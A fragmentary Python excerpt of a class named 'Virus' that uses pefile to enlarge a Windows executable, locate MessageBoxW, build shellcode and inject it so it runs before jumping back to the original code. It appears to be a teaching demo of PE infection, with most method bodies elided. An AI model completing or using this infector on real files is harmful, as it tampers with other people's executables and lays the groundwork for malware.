...
class Virus:
    ...
    def get_len_shell_code(self):
        return hex(self.len_shell_code)

    def get_message_box_w(self, pe):
        # Get the MessageBoxW
    ...
    def create_shell_code(self, virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w):
        ...
        self.payload = shell_code
        return shell_code

    def add_more_space(self, input, output):
    ...
    def injected_shell_code(self, input, output):
        # Path to pe file

        original_size = self.add_more_space(input, output)
        pe = pefile.PE(output)
        raw_address_of_shell_code = original_size
        print("raw address shellcode: ", hex(raw_address_of_shell_code))
        number_of_sections = self.get_info_section(pe)
        ...
        address_of_message_box_w = self.get_message_box_w(pe)

        shell_code = self.create_shell_code(
            virtual_address_of_caption, virtual_address_of_text, jump_address, address_of_message_box_w)

        self.len_shell_code = len(shell_code)
